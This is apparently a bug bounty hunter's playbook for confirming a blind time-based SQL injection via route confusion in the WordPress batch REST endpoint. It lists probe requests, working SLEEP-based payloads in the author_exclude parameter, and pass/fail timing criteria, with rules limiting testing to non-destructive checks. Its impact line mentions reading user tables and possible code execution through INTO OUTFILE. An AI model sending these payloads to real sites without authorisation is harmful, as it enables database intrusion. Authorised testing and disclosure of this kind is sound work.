# Playbook: WP Batch Route Confusion → Blind SQLi — 1 case per test

Target: `POST /wp-json/batch/v1` (or `/?rest_route=/batch/v1`) WP 7.0
Full lesson: `2026/2026-07-21-essity-wp-batch-sqli.md`
Original: https://hackerone.com/reports/3873072

Rule: 1 test at a time. Non-destructive only (no dump).

## 0. Baseline - is WP + batch open?
- `GET /feed/` → save version (`?v=7.0` = target).
- `GET /wp-json/` → batch listed?
- `POST /wp-json/batch/v1` with `{}` → 207 or 401? If 401 try `/?rest_route=/batch/v1`.
- FAIL (401/blocked both) → stop or test authed low-priv.

## 1. Structural desync? (benign `1`)
- Payload from lesson Step 2 with `author_exclude=1` (no SLEEP).
- PASS if: `207` + nested `responses` + `parse_path_failed` + `10 posts returned`. = route confusion.
- FAIL: flat + `rest_cannot_create` → patched, stop.

## 2. SQL parsing? (zero sleep)
- Same, `author_exclude=1) OR SLEEP(0)-- -`
- PASS if: same time as baseline (~0.5s), HTTP 207. = SQL parsed.
- FAIL: 500 syntax / 400 → try encoding, else stop.

## 3. Execution? (tiny sleep)
- `author_exclude=1) OR SLEEP(0.01)-- -`
- PASS if: 0.5s → ~9s (rows × delay). Repeat 2x to rule out network. = blind SQLi confirmed. Stop hunting, report.
- FAIL: same time → not injectable here, try other `*_exclude` params.

## 4. Context (no data steal)
- Note row count (~860), DB version via timing length only. Do NOT extract wp_users.
- Impact statement: can read wp_users/usermeta/options, possible RCE via INTO OUTFILE if FILE priv.

## Notes template
```
Target: /wp-json/batch/v1 version=
0 batch open: 207/401
1 desync nested? y/n
2 SLEEP(0) time=
3 SLEEP(0.01) time= PASS/FAIL
```
